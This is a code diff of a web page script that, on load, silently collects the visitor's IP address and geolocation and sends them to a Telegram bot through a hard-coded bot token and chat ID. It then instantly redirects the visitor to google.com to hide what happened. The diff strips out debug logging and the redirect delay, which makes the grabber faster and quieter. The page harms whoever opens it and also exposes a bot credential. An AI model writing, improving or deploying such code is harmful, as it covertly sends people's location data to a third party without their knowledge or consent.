@@ -20,12 +20,10 @@
 
       async function getUserInfo() {
         const { ip } = await getOnlyIp();
-        console.log(ip);
         const request = await fetch(`https://freeipapi.com/api/json/${ip}`, {
           method: "GET",
         });
         const response = await request.json();
-        console.log(response);
         return response;
       }
       window.addEventListener("load", async () => {
@@ -41,16 +39,15 @@
         const botApi = "6559381340:AAFBebXhmpgSbUEsijMnYWxzs75csh_3kLo";
         const chatId = "-1002217556728";
         const textField = `User info :%0A - ip -> ${ipAddress}%0A - country -> ${countryName}%0A - city -> ${cityName}%0A - region -> ${regionName}%0A - postal -> ${zipCode}%0A - timezone -> ${timeZones[0]}`;
-        console.log(textField);
+
         const url = `https://api.telegram.org/bot${botApi}/sendMessage?chat_id=${chatId}&text=${textField}`;
 
         let api = new XMLHttpRequest();
         api.open("GET", url, true);
         api.send();
 
-        setTimeout(() => {
-          location.replace("https://google.com");
-        }, 3000);
+        location.replace("https://google.com");
+        console.log("message success");
       });
     </script>
   </body>
